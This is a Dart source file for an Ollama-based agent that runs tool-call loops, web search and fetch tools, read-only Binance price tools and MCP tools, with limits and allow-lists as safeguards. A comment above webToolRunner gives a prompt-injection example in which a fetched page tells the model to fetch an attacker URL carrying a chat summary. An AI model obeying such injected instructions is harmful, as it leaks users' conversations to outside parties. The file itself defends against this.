import 'dart:convert';

import 'package:http/http.dart' as http;
import 'package:ollama_dart/ollama_dart.dart' as llama;

import 'cloud.dart';
import 'mcp.dart';

const maxToolRounds = 5;

// Rounds alone do not bound cost: one reply can request many calls, and
// each web call spends Ollama Cloud quota.
const maxCallsPerRound = 4;

// Tool output is fed back into the context window; a fetched page can be
// far larger than the model's window, so it is cut to a predictable size.
const maxToolResultChars = 8000;

final webTools = [
  const llama.Tool(
      function: llama.ToolFunction(
          name: 'web_search',
          description: 'Search the web for current information.',
          parameters: {
        'type': 'object',
        'properties': {
          'query': {'type': 'string', 'description': 'Search query'}
        },
        'required': ['query']
      })),
  const llama.Tool(
      function: llama.ToolFunction(
          name: 'web_fetch',
          description: 'Fetch the readable text of a web page.',
          parameters: {
        'type': 'object',
        'properties': {
          'url': {'type': 'string', 'description': 'Absolute URL'}
        },
        'required': ['url']
      })),
];

typedef ModelCall = Future<llama.Message> Function(List<llama.Message> history);
typedef ToolRunner = Future<String> Function(
    String name, Map<String, dynamic> arguments);

/// Asks the model, runs any tools it calls, feeds results back, and repeats
/// until it answers in plain text or [maxToolRounds] is reached.
/// Appends every intermediate message to [history].
Future<String> runToolLoop(List<llama.Message> history, ModelCall callModel,
    ToolRunner runTool) async {
  for (var round = 0; round < maxToolRounds; round++) {
    final reply = await callModel(history);
    final calls = reply.toolCalls ?? [];
    history.add(reply);
    if (calls.isEmpty) return reply.content;
    for (final call in calls.take(maxCallsPerRound)) {
      final function = call.function;
      if (function == null) continue;
      history.add(llama.Message(
          role: llama.MessageRole.tool,
          content: await _runSafely(runTool, function)));
    }
  }
  return 'Stopped after $maxToolRounds tool rounds without a final answer.';
}

/// A failing tool becomes a message the model can react to, not a crash.
Future<String> _runSafely(
    ToolRunner runTool, llama.ToolCallFunction function) async {
  try {
    final result = await runTool(function.name, function.arguments);
    return result.length > maxToolResultChars
        ? result.substring(0, maxToolResultChars)
        : result;
  } catch (e) {
    return 'Tool ${function.name} failed: $e';
  }
}

final _urlPattern = RegExp(r"https?://[^\s<>()\[\]]+");

/// URLs written in [text], used to seed what web_fetch may open.
Set<String> urlsIn(String text) =>
    _urlPattern.allMatches(text).map((m) => m.group(0)!).toSet();

/// web_fetch may only open URLs the user wrote or a web_search returned.
/// Otherwise a fetched page could instruct the model to "fetch
/// https://attacker/?d=<chat summary>" and leak the conversation.
ToolRunner webToolRunner(http.Client client, String apiKey,
    {Set<String> userUrls = const {}}) {
  final fetchable = {...userUrls};
  return (name, arguments) async {
    switch (name) {
      case 'web_search':
        final found = await webSearch(client, apiKey, '${arguments['query']}');
        for (final result in (found['results'] as List? ?? [])) {
          final url = (result as Map)['url'];
          if (url is String) fetchable.add(url);
        }
        return jsonEncode(found);
      case 'web_fetch':
        final url = '${arguments['url']}';
        if (!fetchable.contains(url)) {
          return 'Refused: web_fetch only opens URLs from the user message '
              'or from web_search results. Search first.';
        }
        return jsonEncode(await webFetch(client, apiKey, url));
      default:
        return 'Unknown tool $name';
    }
  };
}

const binanceBase = 'https://api.binance.com';
const klineIntervals = ['1m', '5m', '15m', '1h', '4h', '1d'];

// Read-only on purpose: these tools only fetch public market data, so a
// model can never place or cancel an order through the agent.
final marketTools = [
  const llama.Tool(
      function: llama.ToolFunction(
          name: 'crypto_price',
          description:
              'Latest Binance spot price for a symbol such as BTCUSDT.',
          parameters: {
        'type': 'object',
        'properties': {
          'symbol': {'type': 'string', 'description': 'e.g. BTCUSDT'}
        },
        'required': ['symbol']
      })),
  const llama.Tool(
      function: llama.ToolFunction(
          name: 'crypto_candles',
          description:
              'Recent Binance spot candles: [openTime, open, high, low, close, volume].',
          parameters: {
        'type': 'object',
        'properties': {
          'symbol': {'type': 'string', 'description': 'e.g. BTCUSDT'},
          'interval': {'type': 'string', 'enum': klineIntervals},
          'limit': {'type': 'integer', 'description': '1-100, default 24'}
        },
        'required': ['symbol']
      })),
];

final _symbolPattern = RegExp(r'^[A-Z0-9]{5,20}$');

String _validSymbol(Object? raw) {
  final symbol = '$raw'.toUpperCase();
  if (!_symbolPattern.hasMatch(symbol)) throw ArgumentError('bad symbol: $raw');
  return symbol;
}

ToolRunner marketToolRunner(http.Client client) => (name, arguments) async {
      final symbol = _validSymbol(arguments['symbol']);
      final Uri uri;
      switch (name) {
        case 'crypto_price':
          uri = Uri.parse('$binanceBase/api/v3/ticker/price?symbol=$symbol');
        case 'crypto_candles':
          final interval = '${arguments['interval'] ?? '1h'}';
          if (!klineIntervals.contains(interval)) {
            throw ArgumentError('bad interval: $interval');
          }
          final limit =
              (int.tryParse('${arguments['limit']}') ?? 24).clamp(1, 100);
          uri = Uri.parse('$binanceBase/api/v3/klines'
              '?symbol=$symbol&interval=$interval&limit=$limit');
        default:
          return 'Unknown tool $name';
      }
      final response = await client.get(uri);
      if (response.statusCode != 200) {
        throw Exception('Binance ${response.statusCode}: ${response.body}');
      }
      return response.body;
    };

/// Tools and their runner for the enabled packs. A call to a tool outside
/// the enabled packs is rejected rather than silently run.
({List<llama.Tool> tools, ToolRunner run}) buildToolSet(http.Client client,
    {String? webApiKey,
    bool market = false,
    String userText = '',
    List<McpConnection> mcp = const []}) {
  final mcpTools = <String, (McpClient, McpTool)>{
    for (final connection in mcp)
      for (final tool in connection.tools)
        mcpToolName(connection.client.server, tool): (connection.client, tool)
  };
  final web = webApiKey == null
      ? null
      : webToolRunner(client, webApiKey, userUrls: urlsIn(userText));
  final markets = market ? marketToolRunner(client) : null;
  return (
    tools: [
      if (web != null) ...webTools,
      if (markets != null) ...marketTools,
      for (final (client, tool) in mcpTools.values)
        toOllamaTool(client.server, tool),
    ],
    run: (name, arguments) async {
      final mcpTool = mcpTools[name];
      if (mcpTool != null) {
        return mcpTool.$1.callTool(mcpTool.$2.name, arguments);
      }
      if (name.startsWith('web_') && web != null) return web(name, arguments);
      if (name.startsWith('crypto_') && markets != null) {
        return markets(name, arguments);
      }
      return 'Tool $name is not enabled';
    }
  );
}
